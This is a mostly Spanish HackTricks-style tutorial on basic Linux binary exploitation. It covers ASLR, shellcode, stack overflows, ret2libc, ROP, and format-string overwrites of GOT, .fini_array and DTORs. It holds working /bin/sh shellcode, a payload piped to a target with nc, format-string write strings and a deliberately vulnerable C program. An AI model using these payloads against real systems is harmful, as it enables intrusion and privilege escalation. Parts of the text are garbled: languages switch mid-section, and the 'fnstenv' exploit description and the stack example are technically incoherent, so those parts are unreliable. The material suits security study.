# Linux Exploiting (B√°sico)

## Linux Exploiting (B√°sico)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* ¬øTrabajas en una **empresa de ciberseguridad**? ¬øQuieres ver tu **empresa anunciada en HackTricks**? ¬øO quieres tener acceso a la **√∫ltima versi√≥n de PEASS o descargar HackTricks en PDF**? ¬°Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obt√©n el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **√önete al** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PR al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## **ASLR**

Aleatorizaci√≥n de direcciones

**Desactivar aleatorizaci√≥n (ASLR) GLOBAL (root)**:\
echo 0 > /proc/sys/kernel/randomize\_va\_space\
Reactivar aleatorizaci√≥n GLOBAL: echo 2 > /proc/sys/kernel/randomize\_va\_space

**Desactivar para una ejecuci√≥n** (no requiere root):\
setarch \`arch\` -R ./ejemplo argumentos\
setarch \`uname -m\` -R ./ejemplo argumentos

**Desactivar protecci√≥n de ejecuci√≥n en pila**\
gcc -fno-stack-protector -D\_FORTIFY\_SOURCE=0 -z norelro -z execstack ejemplo.c -o ejemplo

**Core file**\
ulimit -c unlimited\
gdb /exec core\_file\
/etc/security/limits.conf -> \* soft core unlimited

**Text**\
**Data**\
**BSS**\
**Heap**

**Stack**

**Secci√≥n BSS**: Variables globales o est√°ticas sin inicializar
```
static int i;
```
**Secci√≥n DATA**: Variables globales o est√°ticas inicializadas
```
int i = 5;
```
**Secci√≥n TEXT**: Instructions du code (opcodes)

**Secci√≥n HEAP**: Tampons allou√©s dynamiquement (malloc(), calloc(), realloc())

**Secci√≥n STACK**: La pile (arguments pass√©s, cha√Ænes d'environnement (env), variables locales...)

## **1. D√âBORDEMENTS DE PILE**

> D√©bordement de tampon, d√©passement de tampon, d√©passement de pile, √©crasement de pile

Erreur de segmentation ou violation de segment : lorsqu'on essaie d'acc√©der √† une adresse m√©moire qui n'a pas √©t√© assign√©e au processus.

Pour obtenir l'adresse d'une fonction dans un programme, on peut faire :
```
objdump -d ./PROGRAMA | grep FUNCION
```
## ROP

### Llamada a sys\_execve

{% content-ref url="rop-syscall-execv.md" %}
[rop-syscall-execv.md](rop-syscall-execv.md)
{% endcontent-ref %}

## **2.SHELLCODE**

Ver interrupciones de kernel: cat /usr/include/i386-linux-gnu/asm/unistd\_32.h | grep ‚Äú\_\_NR\_‚Äù

setreuid(0,0); // \_\_NR\_setreuid 70\
execve(‚Äú/bin/sh‚Äù, args\[], NULL); // \_\_NR\_execve 11\
exit(0); // \_\_NR\_exit 1

xor eax, eax ; limpiamos eax\
xor ebx, ebx ; ebx = 0 pues no hay argumento que pasar\
mov al, 0x01 ; eax = 1 ‚Äî> \_\_NR\_exit 1\
int 0x80 ; Ejecutar syscall

**nasm -f elf assembly.asm** ‚Äî> Devuelve un archivo .o\
**ld assembly.o -o shellcodeout** ‚Äî> Genera un ejecutable formado por el c√≥digo ensamblador y podemos obtener los opcodes con **objdump**\
**objdump -d -Mintel ./shellcodeout** ‚Äî> Para verificar que es nuestra shellcode y obtener los OpCodes

**Comprobar que la shellcode funciona**
```
char shellcode[] = ‚Äú\x31\xc0\x31\xdb\xb0\x01\xcd\x80‚Äù

void main(){
            void (*fp) (void);
            fp = (void *)shellcode;
            fp();
}<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">‚Äã</span>
```
To verify that system calls are being made correctly, you should compile the previous program and the system calls should appear in **strace ./COMPILED\_PROGRAM**

When creating shellcodes, a trick can be performed. The first instruction is a jump to a call. The call calls the original code and also puts the EIP on the stack. After the call instruction, we have inserted the string we need, so with that EIP we can point to the string and continue executing the code.

EXAMPLE **TRICK (/bin/sh)**:
```
jmp                 0x1f                                        ; Salto al √∫ltimo call
popl                %esi                                       ; Guardamos en ese la direcci√≥n al string
movl               %esi, 0x8(%esi)       ; Concatenar dos veces el string (en este caso /bin/sh)
xorl                 %eax, %eax             ; eax = NULL
movb  %eax, 0x7(%esi)     ; Ponemos un NULL al final del primer /bin/sh
movl               %eax, 0xc(%esi)      ; Ponemos un NULL al final del segundo /bin/sh
movl   $0xb, %eax               ; Syscall 11
movl               %esi, %ebx               ; arg1=‚Äú/bin/sh‚Äù
leal                 0x8(%esi), %ecx      ; arg[2] = {‚Äú/bin/sh‚Äù, ‚Äú0‚Äù}
leal                 0xc(%esi), %edx      ; arg3 = NULL
int                    $0x80                         ; excve(‚Äú/bin/sh‚Äù, [‚Äú/bin/sh‚Äù, NULL], NULL)
xorl                 %ebx, %ebx             ; ebx = NULL
movl   %ebx, %eax            
inc                   %eax                          ; Syscall 1
int                    $0x80                         ; exit(0)
call                  -0x24                          ; Salto a la primera instruci√≥n
.string             \‚Äù/bin/sh\‚Äù                               ; String a usar<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">‚Äã</span>
```
**EJ usando el Stack(/bin/sh):**

En este ejemplo, utilizaremos una vulnerabilidad de desbordamiento de b√∫fer en un programa vulnerable para ejecutar una shell (/bin/sh) en el sistema objetivo. Primero, necesitamos encontrar la direcci√≥n de memoria del shell que queremos ejecutar. Podemos hacer esto usando el siguiente comando:

```
$ objdump -d /bin/sh | grep execve
```

Esto nos dar√° la direcci√≥n de memoria de la funci√≥n execve() en el shell. A continuaci√≥n, necesitamos crear un patr√≥n de desbordamiento de b√∫fer para determinar la ubicaci√≥n exacta en la que podemos sobrescribir el valor de retorno de la funci√≥n vulnerable. Podemos hacer esto usando la herramienta Metasploit:

```
$ /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1000
```

Una vez que tenemos el patr√≥n, podemos enviarlo al programa vulnerable y observar el valor de EIP (Extended Instruction Pointer) en el momento del choque. Podemos hacer esto usando gdb:

```
$ gdb -q vulnerable_program
(gdb) run < <(echo -e "pattern_here")
```

Una vez que tenemos la direcci√≥n exacta de EIP, podemos sobrescribir el valor de retorno con la direcci√≥n de memoria de la funci√≥n execve() en el shell. Podemos hacer esto usando el siguiente comando:

```
$ /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q <value_of_EIP>
```

Finalmente, podemos construir nuestro exploit utilizando la direcci√≥n de memoria de la funci√≥n execve() y la direcci√≥n de memoria de la cadena "/bin/sh". Podemos hacer esto utilizando el siguiente comando:

```
$ (python -c 'print "A"*<offset_value> + "\x<execve_address>" + "\x90"*8 + "\x<bin_sh_address>"'; cat) | nc <target_ip> <target_port>
```

Esto ejecutar√° una shell (/bin/sh) en el sistema objetivo.
```
section .text
global _start
_start:
xor                  eax, eax                     ;Limpieza
mov                al, 0x46                      ; Syscall 70
xor                  ebx, ebx                     ; arg1 = 0
xor                  ecx, ecx                     ; arg2 = 0
int                    0x80                           ; setreuid(0,0)
xor                  eax, eax                     ; eax = 0
push   eax                             ; ‚Äú\0‚Äù
push               dword 0x68732f2f ; ‚Äú//sh‚Äù
push               dword 0x6e69622f; ‚Äú/bin‚Äù
mov                ebx, esp                     ; arg1 = ‚Äú/bin//sh\0‚Äù
push               eax                             ; Null -> args[1]
push               ebx                             ; ‚Äú/bin/sh\0‚Äù -> args[0]
mov                ecx, esp                     ; arg2 = args[]
mov                al, 0x0b                      ; Syscall 11
int                    0x80                           ; excve(‚Äú/bin/sh‚Äù, args[‚Äú/bin/sh‚Äù, ‚ÄúNULL‚Äù], NULL)
```
# EJ FNSTENV:

## Descripci√≥n

Este exploit aprovecha un desbordamiento de b√∫fer en el comando `fnstenv` en sistemas Linux x86. El exploit utiliza una t√©cnica de shellcode b√°sica conocida como "Egg Hunter" para buscar y ejecutar el shellcode en la memoria.

## C√≥mo funciona

El exploit comienza creando un b√∫fer de tama√±o 2048 y llen√°ndolo con NOPs. Luego, se agrega el shellcode al final del b√∫fer. A continuaci√≥n, se agrega una segunda copia del b√∫fer al final del primero. Esta segunda copia se llama "egg" y se utiliza para buscar el shellcode en la memoria.

El exploit luego llama a `fnstenv` con un argumento que hace que el comando escriba en el b√∫fer. Debido al desbordamiento de b√∫fer, el comando escribe m√°s all√° del final del b√∫fer y sobrescribe la direcci√≥n de retorno en la pila.

Cuando `fnstenv` devuelve el control al exploit, el egg hunter busca el shellcode en la memoria y lo ejecuta.

## Requisitos

Este exploit se ha probado en sistemas Linux x86.

## Uso

```
$ gcc exploit.c -o exploit
$ ./exploit
```
```
fabs
fnstenv [esp-0x0c]
pop eax                     ; Guarda el EIP en el que se ejecut√≥ fabs
‚Ä¶
```
**Cazador de huevos:**

Es un peque√±o c√≥digo que busca la shellcode almacenada en las p√°ginas de memoria asociadas a un proceso, buscando una firma espec√≠fica en la shellcode. Es √∫til en casos en los que solo se dispone de un peque√±o espacio para inyectar c√≥digo.

**Shellcodes polim√≥rficos**

Son shells cifradas que contienen un peque√±o c√≥digo que las descifra y salta a ellas, utilizando el truco de Call-Pop. Un ejemplo de cifrado C√©sar ser√≠a:
```
global _start
_start:
            jmp short magic
init:
            pop     esi
            xor      ecx, ecx
            mov    cl,0                              ; Hay que sustituir el 0 por la longitud del shellcode (es lo que recorrer√°)
desc:
            sub     byte[esi + ecx -1], 0 ; Hay que sustituir el 0 por la cantidad de bytes a restar (cifrado cesar)
            sub     cl, 1
            jnz       desc
            jmp     short sc
magic:
            call init
sc:
            ;Aqu√≠ va el shellcode
```
1. **Attacking the Frame Pointer (EBP)**

Useful in a situation where we can modify the EBP but not the EIP.

It is known that when exiting a function, the following assembly code is executed:
```
movl               %ebp, %esp
popl                %ebp
ret
```
De esta manera, si se puede modificar el EBP al salir de una funci√≥n (fvuln) que ha sido llamada por otra funci√≥n, cuando la funci√≥n que llam√≥ a fvuln finalice, su EIP puede ser modificado.

En fvuln se puede introducir un EBP falso que apunte a un sitio donde est√© la direcci√≥n de la shellcode + 4 (hay que sumarle 4 por el pop). As√≠, al salir de la funci√≥n, se meter√° en ESP el valor de &(\&Shellcode)+4, con el pop se le restar√° 4 al ESP y este apuntar√° a la direcci√≥n de la shellcode cuando se ejecute el ret.

**Exploit:**\
\&Shellcode + "AAAA" + SHELLCODE + relleno + &(\&Shellcode)+4

**Exploit Off-by-One**\
Se permite modificar tan solo el byte menos significativo del EBP. Se puede llevar a cabo un ataque como el anterior pero la memoria que guarda la direcci√≥n de la shellcode debe compartir los 3 primeros bytes con el EBP.

## **4. M√©todos return to Libc**

M√©todo √∫til cuando el stack no es ejecutable o deja un buffer muy peque√±o para modificar.

El ASLR provoca que en cada ejecuci√≥n las funciones se carguen en posiciones distintas de la memoria. Por lo tanto este m√©todo puede no ser efectivo en ese caso. Para servidores remotos, como el programa est√° siendo ejecutado constantemente en la misma direcci√≥n s√≠ puede ser √∫til.

* **cdecl(C declaration)** Mete los argumentos en el stack y tras salir de la funci√≥n limpia la pila
* **stdcall(standard call)** Mete los argumentos en la pila y es la funci√≥n llamada la que la limpia
* **fastcall** Mete los dos primeros argumentos en registros y el resto en la pila

Se pone la direcci√≥n de la instrucci√≥n system de libc y se le pasa como argumento el string ‚Äú/bin/sh‚Äù, normalmente desde una variable de entorno. Adem√°s, se usa la direcci√≥n a la funci√≥n exit para que una vez que no se requiera m√°s la shell, salga el programa sin dar problemas (y escribir logs).

**export SHELL=/bin/sh**

Para encontrar las direcciones que necesitaremos se puede mirar dentro de **GDB:**\
**p system**\
**p exit**\
**rabin2 -i ejecutable** ‚Äî> Da la direcci√≥n de todas las funciones que usa el programa al cargarse\
(Dentro de un start o algun breakpoint): **x/500s $esp** ‚Äî> Buscamos dentro de aqui el string /bin/sh

Una vez tengamos estas direcciones el **exploit** quedar√≠a:

‚ÄúA‚Äù \* DISTANCIA EBP + 4 (EBP: pueden ser 4 "A"s aunque mejor si es el EBP real para evitar fallos de segmentaci√≥n) + Direcci√≥n de **system** (sobreescribir√° el EIP) + Direcci√≥n de **exit** (al salir de system(‚Äú/bin/sh‚Äù) se llamar√° a esta funci√≥n pues los primero 4bytes del stack son tratados como la siguiente direcci√≥n del EIP a ejecutar) + Direcci√≥n de ‚Äú**/bin/sh**‚Äù (ser√° el par√°metro pasado a system)

De esta forma el EIP se sobreescribir√° con la direcci√≥n de system la cual recibir√° como par√°metro el string ‚Äú/bin/sh‚Äù y al salir de este ejecutar√° la funci√≥n exit().

Es posible encontrarse en la situaci√≥n de que alg√∫n byte de alguna direcci√≥n de alguna funci√≥n sea nulo o espacio (\x20). En ese caso se pueden desensamblar las direcciones anteriores a dicha funci√≥n pues probablemente haya varios NOPs que nos permitan poder llamar a alguno de ellos en vez de a la funci√≥n directamente (por ejemplo con > x/8i system-4).

Este m√©todo funciona pues al llamar a una funci√≥n como system usando el opcode **ret** en vez de **call**, la funci√≥n entiende que los primeros 4bytes ser√°n la direcci√≥n **EIP** a la que volver.

Una t√©cnica interesante con este m√©todo es el llamar a **strncpy()** para mover un payload del stack al heap y posteriormente usar **gets()** para ejecutar dicho payload.

Otra t√©cnica interesante es el uso de **mprotect()** la cual permite asignar los permisos deseados a cualquier parte de la memoria. Sirve o serv√≠a en BDS, MacOS y OpenBSD, pero no en linux(controla que no se puedan otorgar a la vez permisos de escritura y ejecuci√≥n). Con este ataque se podr√≠a volver a configurar la pila como ejecutable.

**Encadenamiento de funciones**

Bas√°ndonos en la t√©cnica anterior, esta forma de exploit consiste en:\
Relleno + \&Funci√≥n1 + \&pop;ret; + \&arg\_fun1 + \&Funci√≥n2 + \&pop;ret; + \&arg\_fun2 + ‚Ä¶

De esta forma se pueden encadenar funciones a las que llamar. Adem√°s, si se quieren usar funciones con varios argumentos, se pueden poner los argumentos necesarios (ej 4) y buscar direcci√≥n a un sitio con opcodes: pop, pop, pop, pop, ret ‚Äî> **objdump -d ejecutable**

**Encadenamiento mediante falseo de frames (encadenamiento de EBPs)**

Consiste en aprovechar el poder manipular el EBP para ir encadenando la ejecuci√≥n de varias funciones a trav√©s del EBP y de "leave;ret"

RELLENO

* Situamos en el EBP un EBP falso que apunta a: 2¬∫ EBP\_falso + la funci√≥n a ejecutar: (\&system() + \&leave;ret + &‚Äú/bin/sh‚Äù)
* En el EIP ponemos de direcci√≥n una funci√≥n &(leave;ret)

Iniciamos la shellcode con la direcci√≥n a la siguiente parte de la shellcode, por ej: 2¬∫EBP\_falso + \&system() + &(leave;ret;) + &‚Äù/bin/sh‚Äù

el 2¬∫EBP ser√≠a: 3¬∫EBP\_falso + \&system() + &(leave;ret;) + &‚Äù/bin/ls‚Äù

Esta shellcode se puede repetir indefinidamente en las partes de memoria a las que se tenga acceso de forma que se conseguir√° una shellcode f√°cilmente divisible por peque√±os trozos de memoria.

(Se encadena la ejecuci√≥n de funciones mezclando las vulnerabilidades vistas anteriormente de EBP y de ret2lib)

## **5.M√©todos complementarios**

**Ret2Ret**

√ötil para cuando no se puede meter una direcci√≥n del stack en el EIP (se comprueba que el EIP no contenga 0xbf) o cuando no se puede calcular la ubicaci√≥n de la shellcode. Pero, la funci√≥n vulnerable acepte un par√°metro (la shellcode ir√° aqu√≠).

De esta forma, al cambiar el EIP por una direcci√≥n a un **ret**, se cargar√° la siguiente direcci√≥n (que es la direcci√≥n del primer argumento de la funci√≥n). Es decir, se cargar√° la shellcode.

El exploit quedar√≠a: SHELLCODE + Relleno (hasta EIP) + **\&ret** (los siguientes bytes de la pila apuntan al inicio de la shellcode pues se mete en el stack la direcci√≥n al par√°metro pasado)

Al parecer funciones como **strncpy** una vez completas eliminan de la pila la direcci√≥n donde estaba guardada la shellcode imposibilitando esta t√©cnica. Es decir, la direcci√≥n que pasan a la funci√≥n como argumento (la que guarda la shellcode) es modificada por un 0x00 por lo que al llamar al segundo **ret** se encuentra con un 0x00 y el programa muere.
```
        **Ret2PopRet**
```
Si no tenemos control sobre el primer argumento pero s√≠ sobre el segundo o el tercero, podemos sobreescribir EIP con una direcci√≥n a pop-ret o pop-pop-ret, seg√∫n la que necesitemos.

**T√©cnica de Murat**

En Linux, todos los programas se mapean comenzando en 0xbfffffff.

Viendo c√≥mo se construye la pila de un nuevo proceso en Linux, se puede desarrollar un exploit de forma que el programa sea arrancado en un entorno cuya √∫nica variable sea la shellcode. La direcci√≥n de esta entonces se puede calcular como: addr = 0xbfffffff - 4 - strlen(NOMBRE\_ejecutable\_completo) - strlen(shellcode)

De esta forma, se obtendr√≠a de forma sencilla la direcci√≥n donde est√° la variable de entorno con la shellcode.

Esto se puede hacer gracias a que la funci√≥n execle permite crear un entorno que solo tenga las variables de entorno que se deseen.

**Jump to ESP: Windows Style**

Debido a que el ESP est√° apuntando al comienzo del stack siempre, esta t√©cnica consiste en sustituir el EIP con la direcci√≥n a una llamada a **jmp esp** o **call esp**. De esta forma, se guarda la shellcode despu√©s de la sobreescritura del EIP ya que despu√©s de ejecutar el **ret** el ESP se encontrar√° apuntando a la direcci√≥n siguiente, justo donde se ha guardado la shellcode.

En caso de que no se tenga el ASLR activo en Windows o Linux, se puede llamar a **jmp esp** o **call esp** almacenadas en alg√∫n objeto compartido. En caso de que est√© el ASLR, se podr√≠a buscar dentro del propio programa vulnerable.

Adem√°s, el hecho de poder colocar la shellcode despu√©s de la corrupci√≥n del EIP en vez de en medio del stack, permite que las instrucciones push o pop que se ejecuten en medio de la funci√≥n no lleguen a tocar la shellcode (cosa que podr√≠a ocurrir en caso de ponerse en medio del stack de la funci√≥n).

De forma muy similar a esto, si sabemos que una funci√≥n devuelve la direcci√≥n donde est√° guardada la shellcode, se puede llamar a **call eax** o **jmp eax (ret2eax).**

**ROP (Return Oriented Programming) o borrowed code chunks**

Los trozos de c√≥digo que se invocan se conocen como gadgets.

Esta t√©cnica consiste en encadenar distintas llamadas a funciones mediante la t√©cnica de **ret2libc** y el uso de **pop,ret**.

En algunas arquitecturas de procesadores, cada instrucci√≥n es un conjunto de 32 bits (MIPS por ejemplo). Sin embargo, en Intel las instrucciones son de tama√±o variable y varias instrucciones pueden compartir un conjunto de bits, por ejemplo:

**movl $0xe4ff, -0x(%ebp)** ‚Äî> Contiene los bytes 0xffe4 que tambi√©n se traducen por: **jmp \*%esp**

De esta forma, se pueden ejecutar algunas instrucciones que realmente ni siquiera est√°n en el programa original.

**ROPgadget.py** nos ayuda a encontrar valores en binarios.

Este programa tambi√©n sirve para crear los **payloads**. Le puedes dar la librer√≠a de la que quieres sacar los ROPs y √©l generar√° un payload en python al cual tu le das la direcci√≥n en la que est√° dicha librer√≠a y el payload ya est√° listo para ser usado como shellcode. Adem√°s, como usa llamadas al sistema, no ejecuta realmente nada en el stack sino que solo va guardando direcciones de ROPs que se ejecutar√°n mediante **ret**. Para usar este payload hay que llamar al payload mediante una instrucci√≥n **ret**.

**Integer overflows**

Este tipo de overflows se producen cuando una variable no est√° preparada para soportar un n√∫mero tan grande como se le pasa, posiblemente por una confusi√≥n entre variables con y sin signo, por ejemplo:
```c
#include <stdion.h>
#include <string.h>
#include <stdlib.h>

int main(int argc, char *argv[]){
int len;
unsigned int l;
char buffer[256];
int i;
len = l = strtoul(argv[1], NULL, 10);
printf("\nL = %u\n", l);
printf("\nLEN = %d\n", len);
if (len >= 256){
printf("\nLongitus excesiva\n");
exit(1);
}
if(strlen(argv[2]) < l)
strcpy(buffer, argv[2]);
else
printf("\nIntento de hack\n");
return 0;
}
```
En el ejemplo anterior vemos que el programa se espera 2 par√°metros. El primero es la longitud de la siguiente cadena y el segundo es la cadena.

Si le pasamos como primer par√°metro un n√∫mero negativo, saldr√° que len < 256 y pasaremos ese filtro. Adem√°s, strlen(buffer) ser√° menor que l, pues l es unsigned int y ser√° muy grande.

Este tipo de desbordamientos no busca escribir algo en el proceso del programa, sino superar filtros mal dise√±ados para explotar otras vulnerabilidades.

**Variables no inicializadas**

No se sabe el valor que puede tomar una variable no inicializada y podr√≠a ser interesante observarlo. Puede ser que tome el valor que tomaba una variable de la funci√≥n anterior y esta sea controlada por el atacante.

## **Format Strings**

En C, **`printf`** es una funci√≥n que se puede utilizar para **imprimir** una cadena. El **primer par√°metro** que espera esta funci√≥n es el **texto sin formato con los formateadores**. Los **par√°metros siguientes** esperados son los **valores** para **sustituir** los **formateadores** del texto sin formato.

La vulnerabilidad aparece cuando un **atacante coloca un texto especial como primer argumento** en esta funci√≥n. El atacante podr√° crear una **entrada especial abusando de las capacidades de formato de cadena de printf** para **escribir cualquier dato en cualquier direcci√≥n**. De esta manera, puede **ejecutar c√≥digo arbitrario**.

Formateadores:
```bash
%08x ‚Äî> 8 hex bytes
%d ‚Äî> Entire
%u ‚Äî> Unsigned
%s ‚Äî> String
%n ‚Äî> Number of written bytes
%hn ‚Äî> Occupies 2 bytes instead of 4
<n>$X ‚Äî> Direct access, Example: ("%3$d", var1, var2, var3) ‚Äî> Access to var3
```
El **`%n`** **escribe** el **n√∫mero de bytes escritos** en la **direcci√≥n indicada. Escribir** tantos **bytes** como el n√∫mero hexadecimal que necesitamos escribir es c√≥mo podemos **escribir cualquier dato**.
```bash
AAAA%.6000d%4\$n ‚Äî> Write 6004 in the address indicated by the 4¬∫ param
AAAA.%500\$08x ‚Äî> Param at offset 500
```
### \*\*GOT (Tabla Global de Desplazamientos) / PLT (\*\*Tabla de Enlace de Procedimientos)

Esta es la tabla que contiene la **direcci√≥n** de las **funciones externas** utilizadas por el programa.

Obt√©n la direcci√≥n de esta tabla con: **`objdump -s -j .got ./exec`**

![](<../../.gitbook/assets/image (619).png>)

Observa c√≥mo despu√©s de **cargar** el **ejecutable** en GEF puedes **ver** las **funciones** que est√°n en el **GOT**: `gef‚û§ x/20x 0xDIR_GOT`

![](<../../.gitbook/assets/image (620) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (5).png>)

Usando GEF puedes **iniciar** una **sesi√≥n de depuraci√≥n** y ejecutar **`got`** para ver la tabla got:

![](<../../.gitbook/assets/image (621).png>)

En un binario, el GOT tiene las **direcciones de las funciones o** de la **secci√≥n PLT** que cargar√° la direcci√≥n de la funci√≥n. El objetivo de esta explotaci√≥n es **sobrescribir la entrada GOT** de una funci√≥n que se va a ejecutar m√°s tarde **con** la **direcci√≥n** del PLT de la **funci√≥n `system`**. Idealmente, **sobrescribir√°s** el **GOT** de una **funci√≥n** que se **llamar√° con par√°metros controlados por ti** (para que puedas controlar los par√°metros enviados a la funci√≥n del sistema).

Si **`system`** **no se usa** en el script, la funci√≥n del sistema **no tendr√° una entrada en el GOT**. En este escenario, **necesitar√°s filtrar primero la direcci√≥n** de la funci√≥n `system`.

La **Tabla de Enlace de Procedimientos** es una tabla **de solo lectura** en el archivo ELF que almacena todos los **s√≠mbolos necesarios que necesitan una resoluci√≥n**. Cuando se llama a una de estas funciones, el **GOT** **redirigir√°** el **flujo** al **PLT** para que pueda **resolver** la **direcci√≥n** de la funci√≥n y escribirla en el GOT.\
Luego, la **pr√≥xima vez** que se realice una llamada a esa direcci√≥n, la **funci√≥n** se **llama directamente** sin necesidad de resolverla.

Puedes ver las direcciones PLT con **`objdump -j .plt -d ./vuln_binary`**

### **Flujo de Explotaci√≥n**

Como se explic√≥ anteriormente, el objetivo va a ser **sobrescribir** la **direcci√≥n** de una **funci√≥n** en la tabla **GOT** que se va a llamar m√°s tarde. Idealmente, podr√≠amos establecer la **direcci√≥n en un shellcode** ubicado en una secci√≥n ejecutable, pero es muy probable que no puedas escribir un shellcode en una secci√≥n ejecutable.\
Entonces, una opci√≥n diferente es **sobrescribir** una **funci√≥n** que **recibe** sus **argumentos** del **usuario** y **apuntarla** a la **funci√≥n `system`**.

Para escribir la direcci√≥n, generalmente se realizan 2 pasos: primero se **escriben 2 bytes** de la direcci√≥n y luego los otros 2. Para hacerlo se utiliza **`$hn`**.

**HOB** se refiere a los 2 bytes m√°s altos de la direcci√≥n\
**LOB** se refiere a los 2 bytes m√°s bajos de la direcci√≥n

Entonces, debido a c√≥mo funciona la cadena de formato, necesitas **escribir primero el m√°s peque√±o** de \[HOB, LOB] y luego el otro.

Si HOB < LOB\
`[address+2][address]%.[HOB-8]x%[offset]\$hn%.[LOB-HOB]x%[offset+1]`

Si HOB > LOB\
`[address+2][address]%.[LOB-8]x%[offset+1]\$hn%.[HOB-LOB]x%[offset]`

HOB LOB HOB\_shellcode-8 N¬∫Param\_dir\_HOB LOB\_shell-HOB\_shell N¬∫Param\_dir\_LOB

\`python -c 'print "\x26\x97\x04\x08"+"\x24\x97\x04\x08"+ "%.49143x" + "%4$hn" + "%.15408x" + "%5$hn"'\`

### **Plantilla de Explotaci√≥n de Cadena de Formato**

Puedes encontrar una **plantilla** para explotar el GOT usando cadenas de formato aqu√≠:

{% content-ref url="format-strings-template.md" %}
[format-strings-template.md](format-strings-template.md)
{% endcontent-ref %}

### **.fini\_array**

B√°sicamente, esta es una estructura con **funciones que se llamar√°n** antes de que el programa termine. Esto es interesante si puedes llamar a tu **shellcode saltando a una direcci√≥n**, o en casos en los que necesitas volver a main de nuevo para **explotar la cadena de formato una segunda vez**.
```bash
objdump -s -j .fini_array ./greeting

./greeting:     file format elf32-i386

Contents of section .fini_array:
 8049934 a0850408

#Put your address in 0x8049934
```
Tenga en cuenta que esto **no crear√°** un **bucle eterno** porque cuando regrese a la funci√≥n principal, el canario lo notar√°, el final de la pila podr√≠a estar corrompido y la funci√≥n no se volver√° a llamar. Por lo tanto, con esto podr√° **tener una ejecuci√≥n m√°s** de la vulnerabilidad.

### **Cadenas de formato para volcar contenido**

Una cadena de formato tambi√©n puede ser abusada para **volcar contenido** de la memoria del programa.\
Por ejemplo, en la siguiente situaci√≥n hay una **variable local en la pila que apunta a una bandera**. Si **encuentra** d√≥nde en la **memoria** est√° el **puntero** a la **bandera**, puede hacer que **printf acceda** a esa **direcci√≥n** e **imprima** la **bandera**:

Entonces, la bandera est√° en **0xffffcf4c**

![](<../../.gitbook/assets/image (618) (2).png>)

Y desde la fuga puede ver que el **puntero a la bandera** est√° en el **octavo** par√°metro:

![](<../../.gitbook/assets/image (623).png>)

Por lo tanto, **accediendo** al **octavo par√°metro** puede obtener la bandera:

![](<../../.gitbook/assets/image (624).png>)

Tenga en cuenta que despu√©s del **ataque anterior** y darse cuenta de que puede **filtrar contenido**, puede **establecer punteros** a **`printf`** en la secci√≥n donde se **carga el ejecutable** y **volcarlo** **completamente**.

### **DTOR**

{% hint style="danger" %}
Hoy en d√≠a es muy **raro encontrar un binario con una secci√≥n dtor**.
{% endhint %}

Los destructores son funciones que se **ejecutan antes de que el programa termine**.\
Si logra **escribir** una **direcci√≥n** a un **shellcode** en **`__DTOR_END__`**, eso se **ejecutar√°** antes de que el programa termine.\
Obtenga la direcci√≥n de esta secci√≥n con:
```bash
objdump -s -j .dtors /exec
rabin -s /exec | grep ‚Äú__DTOR‚Äù
```
Normalmente encontrar√°s la secci√≥n **DTOR** **entre** los valores `ffffffff` y `00000000`. As√≠ que si solo ves esos valores, significa que **no hay ninguna funci√≥n registrada**. Por lo tanto, **sobrescribe** el **`00000000`** con la **direcci√≥n** del **shellcode** para ejecutarlo.

### **Cadenas de formato para desbordamientos de b√∫fer**

La funci√≥n **sprintf** mueve una cadena formateada a una **variable**. Por lo tanto, se podr√≠a abusar del **formateo** de una cadena para causar un **desbordamiento de b√∫fer en la variable** donde se copia el contenido.\
Por ejemplo, la carga √∫til `%.44xAAAA` escribir√° **44B+"AAAA" en la variable**, lo que puede causar un desbordamiento de b√∫fer.

### **Estructuras \_\_atexit**

{% hint style="danger" %}
Hoy en d√≠a es muy **extra√±o explotar esto**.
{% endhint %}

**`atexit()`** es una funci√≥n a la que se le pasan **otras funciones como par√°metros**. Estas **funciones** se **ejecutar√°n** al ejecutar un **`exit()`** o al **retorno** del **main**.\
Si puedes **modificar** la **direcci√≥n** de cualquiera de estas **funciones** para que apunte a un shellcode, por ejemplo, **obtendr√°s el control** del **proceso**, pero esto es actualmente m√°s complicado.\
Actualmente, las **direcciones de las funciones** que se ejecutar√°n est√°n **ocultas** detr√°s de varias estructuras y finalmente la direcci√≥n a la que apuntan no son las direcciones de las funciones, sino que est√°n **cifradas con XOR** y desplazamientos con una **clave aleatoria**. Por lo tanto, actualmente este vector de ataque no es muy √∫til al menos en x86 y x64\_86.\
La **funci√≥n de cifrado** es **`PTR_MANGLE`**. **Otras arquitecturas** como m68k, mips32, mips64, aarch64, arm, hppa... **no implementan el cifrado** porque **devuelve lo mismo** que recibi√≥ como entrada. Por lo tanto, estas arquitecturas ser√≠an atacables por este vector.

### **setjmp() y longjmp()**

{% hint style="danger" %}
Hoy en d√≠a es muy **extra√±o explotar esto**.
{% endhint %}

**`Setjmp()`** permite **guardar** el **contexto** (los registros)\
